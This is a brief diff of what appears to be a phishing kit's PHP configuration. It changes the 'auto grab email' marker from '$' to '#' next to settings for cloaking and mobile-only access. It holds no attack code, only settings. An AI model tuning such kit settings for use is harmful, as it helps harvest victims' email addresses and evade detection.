@@ -38,7 +38,7 @@ $cloaker = [
 
 $auto_grabber = true; // Activate Auto Grab Email
 
-$auto_grabber_code = "$";
+$auto_grabber_code = "#";
 
 $mobile_access = True; // Access only from mobile device
 
